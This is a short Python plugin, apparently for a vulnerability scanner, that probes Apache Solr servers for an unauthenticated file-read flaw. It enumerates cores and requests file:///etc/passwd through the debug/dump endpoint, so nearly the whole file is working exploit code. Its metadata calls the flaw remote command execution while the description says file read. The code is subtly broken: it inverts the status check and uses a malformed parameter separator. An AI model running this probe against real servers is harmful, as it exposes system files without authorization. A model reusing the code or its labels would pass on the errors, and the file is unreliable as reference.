# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "Apache Solr 远程命令执行漏洞",
        "version": "Apache Solr <= 8.8.1",
        "dork": "app=\"apache-Solr\"",
        "description": "Apache Solr存在任意文件读取漏洞攻击者可以在未授权的情况下获取目标服务器敏感文件",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(method='get', path='./solr/admin/cores?indexInfo=false&wt=json', timeout=15)
        if r.status_code != 200:
            for i in r.json()['status']:
                r1 = self.request(
                    method='POST',
                    path=f'./solr/{i}/debug/dump?param=ContentStreams?stream.url=file:///etc/passwd',
                    timeout=15,
                )
                resp = r1.json()
                if resp['streams'] and 'root:x:0:0:' in resp['streams'][0]['stream']:
                    return {"LoopholeInfo": self.__info__}
